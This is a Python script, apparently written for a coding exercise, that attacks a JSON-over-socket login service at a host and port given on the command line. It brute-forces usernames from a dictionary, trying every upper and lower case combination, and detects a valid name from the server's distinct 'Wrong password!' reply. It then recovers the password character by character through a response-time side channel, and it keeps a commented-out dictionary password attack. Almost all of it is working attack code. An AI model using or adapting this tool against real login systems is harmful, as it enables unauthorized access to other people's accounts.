import itertools
import socket
import sys
import os
import json
import time

def all_case_combinations(word):
    return map(''.join, itertools.product(*zip(word.upper(), word.lower())))


def establish_connection():
    # Read the login dictionary
    with open(os.path.join(os.getcwd(), 'logins.txt'), 'r') as f:
        login_list = f.read().splitlines()
    # Read the password dictionary
    with open(os.path.join(os.getcwd(), 'passwords.txt'), 'r') as f:
        password_list = f.read().splitlines()

    args = sys.argv
    host = args[1]
    port = args[2]
    address = (host, int(port))
    client_socket = socket.socket()
    client_socket.connect(address)
    login = ""
    found_login = False

    for login in login_list:
        for guess_login in all_case_combinations(login):
            data = {"login": guess_login,
                    "password": ""
                    }
            # print(f"login is {guess_login}")
            json_data = json.dumps(data).encode()
            # print("json_data is :>", json_data)
            client_socket.send(json_data)
            response = client_socket.recv(1024)
            decoded_response = json.loads(response.decode())
            # print("decoded_response is :>", decoded_response)

            # we got the password, break the loop
            if decoded_response == {"result": "Wrong password!"}:
                # print("guess login is:>", guess_login)
                login = guess_login
                # client_socket.close()
                found_login = True
                break
        if found_login:  # check the flag in the outer loop
            break

    if len(login) > 0:
        # print("password part")
        # client_socket = socket.socket()
        # client_socket.connect(address)
        possible_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        password_so_far = ""

        while True:
            found_char = False

            for char in possible_characters:
                current_attempt = password_so_far + char
                data = {"login": login, "password": current_attempt}
                json_data = json.dumps(data).encode()

                start_time = time.time()
                client_socket.send(json_data)
                response = client_socket.recv(1024)
                end_time = time.time()
                response_time = end_time - start_time
                decoded_response = json.loads(response.decode())

                # we got the password, break the loop
                if decoded_response == {"result": "Connection success!"}:
                    # print("username and password is :>", json_data)
                    print(json.dumps(data))

                    # print(json_data)
                    client_socket.close()
                    exit(0)

                # we found the next character in the password
                # if decoded_response == {"result": "Exception happened during login"}:
                #     password_so_far = current_attempt
                #     found_char = True
                #     break

                if response_time >= 0.1:  # Set a threshold for delay
                    password_so_far = current_attempt
                    found_char = True
                    break

            # If we didn't find the next character in the password, it means our current password is incorrect.
            if not found_char:
                print("Failed to determine the complete password.")
                exit(1)
        # # for password_length in range(1, 10):
        # for password in password_list:
        #     for guess_password in all_case_combinations(password):
        #
        #         data = {"login": login,
        #                 "password": guess_password
        #                 }
        #         json_data = json.dumps(data).encode()
        #
        #         client_socket.send(json_data)
        #         response = client_socket.recv(1024)
        #         decoded_response = json.loads(response.decode())
        #
        #         # we got the password, break the loop
        #         if decoded_response == {"result": "Connection success!"}:
        #             print("username and password is :>", json_data)
        #             client_socket.close()
        #             break
        #             exit(0)
        #
        #         # we exceed the attempts limit, stop the program
        #         if decoded_response == {"result": "Exception happened during login"}:
        #             print("Exception happened during login")
        #             exit(1)
        #
        #         if decoded_response == {"result": "Bad request!"}:
        #             print("Exception happened during login")
        #             exit(1)
        #         print(json_data)


establish_connection()


